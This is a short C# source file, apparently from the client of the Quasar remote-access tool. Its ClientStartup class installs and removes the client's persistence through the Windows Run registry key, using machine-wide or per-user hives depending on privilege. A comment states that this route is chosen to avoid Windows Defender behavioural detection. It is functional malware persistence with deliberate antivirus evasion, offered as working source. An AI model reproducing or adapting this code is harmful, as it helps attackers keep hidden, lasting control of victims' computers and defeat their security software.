using Microsoft.Win32;
using Quasar.Client.Helper;
using Quasar.Common.Enums;
using System.Diagnostics;

namespace Quasar.Client.Setup
{
    public class ClientStartup : ClientSetupBase
    {
        public void AddToStartup(string executablePath, string startupName)
        {
            if (UserAccount.Type == AccountType.Admin)
            {
                // Use HKLM registry (machine-wide, survives all user logons)
                // Avoids schtasks which triggers Defender behavioral detection
                RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
                    true);
            }
            else
            {
                // Non-admin: use HKCU registry (current user only)
                RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
                    true);
            }
        }

        public void RemoveFromStartup(string startupName)
        {
            if (UserAccount.Type == AccountType.Admin)
            {
                RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
            }
            else
            {
                RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
            }
        }
    }
}
